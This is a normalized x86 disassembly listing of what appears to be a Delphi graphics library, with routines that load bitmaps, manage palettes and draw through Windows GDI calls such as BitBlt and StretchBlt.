mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_428408
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_428cdc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_425f30
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_428234
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_428d44
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax esi
call sub_429454
mov eax [ esi + 0x28 ]
call sub_428238
mov eax [ esi + 0x2c ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41aa38
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_428d80
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_428e38
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402c40
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4296c4
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_428234
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_428238
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41aa64
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_428e70
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_429454
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_428eff
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_428a6c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_428408
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4296c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_428f04
mov eax [ ebp - 0x8 ]
call sub_422d14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_4039e8
call sub_403a3c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_428f30
push ebx
mov ebx eax
mov eax ebx
call sub_429224
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40d524
pop ebx
retn
sub_428f60
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_41c530
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_429454
lea eax [ ebx + 0x2c ]
call sub_40d524
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4296c4
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_428fd4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_424a8c
mov eax ebx
call sub_429564
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_429360
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_429210
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4249b8
push eax
call SetStretchBltMode
mov eax ebx
call sub_4292a4
mov dl [ r-xdata ]
call sub_424a8c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_429504
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_4292a4
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429217
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4291a5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_424db0
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_4292a4
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_424f54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_429224
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_429464
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_428e70
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_424d08
sub_4292a4
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_429464
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_428040
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_428f30
sub_4292ec
push ebx
mov ebx eax
mov eax ebx
call sub_429454
mov eax ebx
call sub_429464
mov edx ebx
mov eax ebx
call sub_428f30
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_429310
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_429390
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_4235e4
mov eax ebx
call sub_429360
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_4292a4
xor edx edx
pop ecx
call sub_424944
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_4293e0
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_429564
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_428408
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_429464
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_41c4cc
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_4294e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_429504
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_429454
mov eax ebx
call sub_429464
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_429390
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_428ad0
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_427fc4
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_429564
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_4254a0
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_427fc4
push 0x0
call GetDC
call sub_424db0
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_42961c
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_424c78
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_428e70
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_429454
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402c40
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_4296a0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_41c4ac
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_429d54
pop esi
pop ebx
retn
sub_4296c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42974b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_4033e4
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4297ab
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_428238
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_428234
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4297b2
push rw-data
call LeaveCriticalSection
retn
sub_4297c4
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_429d54
pop edx
pop edi
pop esi
pop ebx
retn
sub_4297ec
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_40279c
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_429d09
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_429cdc
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402c40
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_424c90
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41c748
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402c40
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41c6d8
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_424f20
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_424f40
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_41c6d8
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_424db0
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_429c57
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_4251e8
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_40279c
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_429bbf
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41c6d8
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_424db0
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_429b93
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_4254a0
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40cfc8
call sub_424c90
jmp r-xdata
xor eax eax
push ebp
push sub_429c26
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41c6d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429b9a
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429c5e
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40cfc8
call sub_424c90
jmp r-xdata
sub_429b9a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4027bc
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_429c5e
mov eax [ ebp - 0x3c ]
